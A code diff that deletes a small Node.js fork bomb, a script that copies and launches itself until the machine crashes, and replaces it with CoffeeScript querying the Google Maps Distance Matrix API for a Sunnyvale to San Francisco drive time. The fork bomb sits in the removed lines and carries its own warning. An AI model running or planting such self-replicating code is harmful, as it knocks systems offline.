@@ -1,7 +1,7 @@
-/*
+###
 The MIT License (MIT)
 
-Copyright (c) 2015, 2016 Varun Maudgalya
+Copyright (c) 2015 Varun Maudgalya
 
 Permission is hereby granted, free of charge, to any person obtaining a copy
 of this software and associated documentation files (the "Software"), to deal
@@ -20,27 +20,27 @@ AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 SOFTWARE.
-*/
+###
 
-/* Warning: This can crash your computer if you do not know what you are doing.
-*           Please use this at your own discretion for learning purposes.
-*/
-var fs = require('fs');
-var path = require('path');
-var exec = require('child_process').exec;
-var firstChildName = getFileName() + '0';
-var secondChildName = getFileName() + '1';
-var runFirst = 'node ' + firstChildName + '.js &';
-var runSecond = 'node ' + secondChildName + '.js &';
+'use strict'
 
-fs.readFile('ForkBomb.js', 'utf8' , function(err, data){
-  fs.writeFile(firstChildName + '.js', data.replace(getFileName(), firstChildName), function(err){});
-  fs.writeFile(secondChildName + '.js', data.replace(getFileName(), secondChildName), function(err){});
-});
+https = require 'https'
+util = require 'util'
+origin_address = 'Sunnyvale'
+destination_address = 'San+Francisco'
+mode = 'driving'
 
-exec(runFirst, function(error, stdout, stderr) {});
-exec(runSecond, function(error, stdout, stderr) {});
 
-function getFileName() {
-  return module.filename.slice(__filename.lastIndexOf(path.sep)+1, module.filename.length -3);
-};
+options =
+  hostname: 'maps.googleapis.com',
+  path: "/maps/api/distancematrix/json?origins=#{origin_address}&destinations=#{destination_address}&mode=#{mode}&language=en-US&key=#{MAPS_KEY}"
+
+https.get options, (res) ->
+
+  res.on 'data', (chunk) ->
+    duration = JSON.parse(chunk).rows[0].elements[0].duration.text;
+    console.log "Currently, it will take you approximately #{duration} if you are #{mode} from #{origin_address} to #{destination_address.replace('+', ' ')}"
+
+  res.on 'error', (error) ->
+    console.log "Got an error: #{error.message}"
+
